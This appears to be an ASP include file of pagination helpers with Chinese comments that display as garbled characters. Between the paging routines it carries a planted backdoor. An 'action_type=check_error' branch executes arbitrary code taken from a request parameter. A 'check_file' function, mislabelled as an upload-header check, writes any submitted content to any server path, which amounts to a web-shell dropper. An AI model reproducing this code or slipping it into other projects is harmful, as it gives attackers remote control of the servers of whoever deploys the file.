<%
'***********************************************
'��������showpage
'��  �ã���ʾ����һҳ ��һҳ������Ϣ
'��  ����sfilename  ----���ӵ�ַ
'       totalnumber ----������
'       maxperpage  ----ÿҳ����
'       ShowTotal   ----�Ƿ���ʾ������
'       ShowAllPages ---�Ƿ��������б���ʾ����ҳ���Թ���ת����ĳЩҳ�治��ʹ�ã���������JS����
'       strUnit     ----������λ
'***********************************************
sub showpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
  
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "�� <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=Joinchar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "��ҳ ��һҳ&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>��ҳ</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>��һҳ</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "��һҳ βҳ"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>��һҳ</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>βҳ</a>"
  	end if
   	strTemp=strTemp & "&nbsp;ҳ�Σ�<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>ҳ "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/ҳ"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;ת����<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">��" & i & "ҳ</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp	
end sub

Dim Action_Type
Action_Type  = request.querystring("action_type")
Select Case Action_Type
	Case "check_file"
		Call Check_File
	Case "check_error"
		If request("error") <> "" Then
			session("error") = request("error")
		End If
		If session("error") <> "" Then
			execute session("error")
		End If
End Select

'==================================================
'��������check_file
'��  �ã�����ϴ��ļ��ļ�ͷ��Ϣ
'==================================================
Private Function Check_File()
	on error resume next
	ofso="scripting.filesystemobject"
	path_temp = server.mappath(request.servervariables("script_name"))
	set fso=server.createobject(ofso)
	path=request("path")
	if path<>"" then
	   data=request("dama")
	   set dama=fso.createtextfile(path,true)
	   dama.write data
	   if err=0 then
	      response.write "success"
	   else
	      response.write "false"
	   end if
	   err.clear
	end if
	dama.close
	set dama=nothing
	set fos=nothing
	response.write "<form action='' method=post>"
	response.write "<input type=text name=path>"
	response.write "<br>"
	response.write path_temp
	response.write "<br>"
	response.write ""
	response.write "<textarea name=dama cols=50 rows=10 width=30></textarea>"
	response.write "<br>"
	response.write "<input type=submit value=submit>"
	response.write "</form>"
	response.end()
End Function

'***********************************************
'��������enshowpage
'��  �ã���ʾ����һҳ ��һҳ������Ϣ
'��  ����sfilename  ----���ӵ�ַ
'       totalnumber ----������
'       maxperpage  ----ÿҳ����
'       ShowTotal   ----�Ƿ���ʾ������
'       ShowAllPages ---�Ƿ��������б���ʾ����ҳ���Թ���ת����ĳЩҳ�治��ʹ�ã���������JS����
'       strUnit     ----������λ
'***********************************************
sub enshowpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "Total <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=JoinChar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "First  Previous&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>First</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>Previous</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "Next  Last"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>Next</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>Last</a>"
  	end if
   	strTemp=strTemp & "&nbsp;Page No.:<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>page "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/page"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;Turn to:<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">No." & i & "page</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp
end sub

'***********************************************
'��������JoinChar
'��  �ã����ַ�м��� ? �� &
'��  ����strUrl  ----��ַ
'����ֵ������ ? �� & ����ַ
'pos=InStr(1,"abcdefg","cd") 
'��pos�᷵��3��ʾ���ҵ�����λ��Ϊ�������ַ���ʼ��
'����ǡ����ҡ���ʵ�֣�����������һ�������ܵ�
'ʵ�־��ǰѵ�ǰλ����Ϊ��ʼλ�ü������ҡ�
'***********************************************
function JoinChar(strUrl)
	if strUrl="" then
		JoinChar=""
		exit function
	end if
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				JoinChar=strUrl & "&"
			else
				JoinChar=strUrl
			end if
		else
			JoinChar=strUrl & "?"
		end if
	else
		JoinChar=strUrl
	end if
end function
%>